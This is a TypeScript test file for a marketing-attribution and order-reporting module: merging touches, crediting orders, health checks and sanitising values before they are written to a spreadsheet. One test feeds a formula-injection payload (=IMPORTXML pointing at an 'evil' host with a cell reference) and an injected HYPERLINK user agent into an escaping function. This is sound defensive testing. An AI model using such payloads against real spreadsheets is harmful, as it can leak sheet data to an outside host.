/** Regressions found by the E2E journeys (docs/attribution BUILD_LOG, E2E round 1). */
import { test } from "node:test";
import assert from "node:assert/strict";
import { creditOrder, mergeServerAttribution, mergeState, parseTouch, type AttributionState, type OrderRecord, type Touch } from "../../api/_attribution_core.ts";
import { buildReport } from "../../scripts/report-lib/build.ts";
import type { ReportData } from "../../scripts/report-lib/load.ts";

const HOST = "beshaa-tova.co.il";
function touch(url: string, ts: string, opts: Parameters<typeof parseTouch>[3] = {}): Touch {
  const t = parseTouch(`https://${HOST}${url}`, null, HOST, { ts, ...opts });
  assert.ok(t);
  return t;
}
const META = "/?ref=meta-333&utm_source=ig&utm_medium=paid_social&utm_campaign=2611_zugot&cid=111&asid=222&aid=333&fbclid=IwAR_X";
const QR = "/?ref=pst-v5-eng-1a-biulib&utm_source=poster&utm_medium=print&utm_campaign=2610_posters_v5";

test("J1: the same landing seen by the browser and the server is one touch; first and last are that touch", () => {
  const client = touch(META, "2026-10-10T08:00:00.100Z");
  const server = touch(META, "2026-10-10T08:00:00.400Z");
  const body: AttributionState = { visitor_id: "", first: client, last: client, touches: [client] };
  const m = mergeServerAttribution(body, { first: server, last: server }, null);
  assert.equal(m.touches.length, 1);
  assert.equal(m.first?.touch_id, client.touch_id);
  assert.equal(m.last?.touch_id, client.touch_id);
});

test("J2: the /q qr_scan (earlier, cookie only) wins over the SPA landing copy 300 ms later", () => {
  const scan = touch(QR, "2026-10-10T08:00:00.100Z", { kind: "qr_scan", q_code: "pst-v5-eng-1a-biulib" });
  const spa = touch(QR, "2026-10-10T08:00:00.400Z");
  const body: AttributionState = { visitor_id: "", first: spa, last: spa, touches: [spa] };
  const m = mergeServerAttribution(body, { first: scan, last: scan }, null);
  assert.deepEqual(m.touches.map((t) => t.touch_id), [scan.touch_id]);
  assert.equal(m.first?.q_code, "pst-v5-eng-1a-biulib");
  assert.equal(m.last?.q_code, "pst-v5-eng-1a-biulib");
  assert.equal(m.last?.kind, "qr_scan");
});

test("mergeState keeps two different touches and the right first/last", () => {
  const a = touch(META, "2026-11-01T08:00:00Z");
  const b = touch(QR, "2026-11-05T08:00:00Z");
  const m = mergeState({ visitor_id: "", first: a, last: a, touches: [a] }, { visitor_id: "", first: b, last: b, touches: [] });
  assert.equal(m.touches.length, 2);
  assert.equal(m.first?.touch_id, a.touch_id);
  assert.equal(m.last?.touch_id, b.touch_id);
});

test("J4: a paid order credited by a typed code with no touch does not fail the health check", () => {
  const credit = creditOrder({ first: null, last: null }, { partner_id: "testcreator", referral: null }, null);
  assert.equal(credit.credit_rule, "code");
  const o = {
    order_id: "BT2611AAAA01", order_kind: "order", created_at: "2026-11-10T09:00:00Z", payment_status: "paid",
    amount_expected: 288, currency: "ILS", price_rule: "promo10_288", client_displayed_amount: 288,
    promo_code: "TESTCREATOR10", partner_id: "testcreator", ...credit, first: null, last: null, touches: [],
    self_reported_source: null, not_engaged: false, visitor_id: "v_x", session_id: null, fbc: null, fbp: null,
    ga_client_id: null, client_ip: null, user_agent: null, event_source_url: null, consent_marketing: "unknown",
    buyer: { name: "A B", phone: "0501234567", email: null }, couple: { name1: "A", name2: "B" },
    lead_event_id: "lead_BT2611AAAA01", grow_process_ids: [], grow_process_token: null, payment_fallback_reason: null,
    paid_at: "2026-11-10T09:05:00Z", paid_amount: 288, grow_transaction_id: "1", asmachta: null, payment_method: "card",
    payer_name: null, payer_phone: null, payer_email: null, match_method: "order_id",
    capi_purchase_event_id: "purchase_BT2611AAAA01", capi_purchase_sent_at: "2026-11-10T09:05:01Z", capi_purchase_result: "logged",
    commission_ils: 43, commission_status: "pending", invoice_number: null, invoice_url: null,
  } as OrderRecord;
  const data: ReportData = {
    source: "file", dir: "/x/.test-data", orders: [o], touches: [],
    payments: [{ payment_id: "1", order_id: o.order_id, provider: "grow_mock", amount: 288, currency: "ILS", paid_at: o.paid_at as string,
      asmachta: null, method: "card", card_suffix: null, installments: 1, verified: true, verification: "process_info", raw_notify_digest: "d" }],
    capi: [{ event_name: "Lead", event_id: `lead_${o.order_id}`, order_id: o.order_id }, { event_name: "Purchase", event_id: `purchase_${o.order_id}`, order_id: o.order_id }],
    codes: [], partners: [], blocked_egress: [],
  };
  const h = buildReport(data, { model: "credited", paidOnly: false, now: new Date("2026-11-11T00:00:00Z") }).health;
  assert.deepEqual(h.paid_no_touch, [o.order_id]);   // still listed
  assert.equal(h.ok, true);
  const id2 = "BT2611AAAA02";
  const touchless = { ...o, order_id: id2, credit_rule: "none", capi_purchase_event_id: `purchase_${id2}` } as OrderRecord;
  const data2: ReportData = {
    ...data, orders: [o, touchless],
    payments: [...data.payments, { ...data.payments[0], payment_id: "2", order_id: id2 }],
    capi: [...data.capi, { event_name: "Lead", event_id: `lead_${id2}`, order_id: id2 }, { event_name: "Purchase", event_id: `purchase_${id2}`, order_id: id2 }],
  };
  const h2 = buildReport(data2, { model: "credited", paidOnly: false, now: new Date("2026-11-11T00:00:00Z") }).health;
  assert.deepEqual(h2.paid_no_touch, [o.order_id, id2]);
  assert.equal(h2.ok, false, "a paid order with no touch and no code still needs attention");
});

// ---- Review round fixes (2026-10-30) -------------------------------------------------------
import { sanitizeTouch, sheetSafe, toSheetColumns } from "../../api/_attribution_core.ts";

test("sanitizeTouch clamps a future-dated client touch to at most now + 5 min", () => {
  const t = touch(META, "2026-10-10T08:00:00Z");
  const s = sanitizeTouch({ ...t, ts: "2099-01-01T00:00:00Z" });
  assert.ok(s);
  assert.ok(Date.parse(s.ts) <= Date.now() + 5 * 60_000 + 1000);
  const past = sanitizeTouch(t);
  assert.equal(past?.ts, new Date("2026-10-10T08:00:00Z").toISOString());
});

test("sheetSafe neutralises formula-leading strings and leaves numbers and plain text alone", () => {
  assert.equal(sheetSafe('=IMPORTXML("https://evil/?"&B2,"//a")'), `'=IMPORTXML("https://evil/?"&B2,"//a")`);
  assert.equal(sheetSafe("+972501234567"), "'+972501234567");
  assert.equal(sheetSafe("-1"), "'-1");
  assert.equal(sheetSafe("@x"), "'@x");
  assert.equal(sheetSafe("\tx"), "'\tx");
  assert.equal(sheetSafe(-5), "-5");
  assert.equal(sheetSafe(320), "320");
  assert.equal(sheetSafe(null), "");
  assert.equal(sheetSafe("Mozilla/5.0"), "Mozilla/5.0");
});

function minimalOrder(): Partial<OrderRecord> {
  return {
    order_id: "BT2610AAAA02", order_kind: "order", created_at: "2026-10-10T09:00:00Z", payment_status: "pending",
    amount_expected: 320, currency: "ILS", price_rule: "standard", promo_code: null, partner_id: null, touches: [],
    buyer: { name: "A B", phone: "0501234567", email: null }, couple: { name1: "A", name2: "B" }, grow_process_ids: [],
  };
}

test("toSheetColumns escapes request-controlled columns (user_agent, session_id)", () => {
  const t = touch(META, "2026-10-10T08:00:00Z");
  const o = { ...minimalOrder(), user_agent: "=HYPERLINK(\"x\")", session_id: "+1", first: t, last: t, touches: [t] } as OrderRecord;
  const cols = toSheetColumns(o) as Record<string, string>;
  assert.equal(cols.user_agent, "'=HYPERLINK(\"x\")");
  assert.equal(cols.session_id, "'+1");
});
